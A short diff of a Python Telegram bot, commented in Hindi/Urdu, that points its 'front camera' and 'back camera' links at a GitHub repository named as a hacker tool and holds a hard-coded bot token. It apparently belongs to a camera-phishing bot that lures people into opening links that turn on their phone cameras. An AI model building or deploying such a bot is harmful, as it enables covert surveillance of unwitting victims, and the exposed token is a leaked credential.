@@ -3,8 +3,8 @@ from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, Callback
 
 # 🔑 Bot Token aur GitHub Pages links
 TOKEN = '7593575018:AAHNy45AArCI3VrxMnZltDt69RfzHLpzZb0'
-FRONT_CAMERA_LINK = 'https://yourusername.github.io/your-repo-name/?camera=user'
-BACK_CAMERA_LINK = 'https://yourusername.github.io/your-repo-name/?camera=environment'
+FRONT_CAMERA_LINK = 'https://github.com/tahiriqbal756/Hacker-TF-TOOL.com/tree/main?camera=user'
+BACK_CAMERA_LINK = 'https://github.com/tahiriqbal756/Hacker-TF-TOOL.com/tree/main?camera=environment'
 
 # 🎛 Start Command: Buttons dikhata hai
 def start(update: Update, context: CallbackContext):
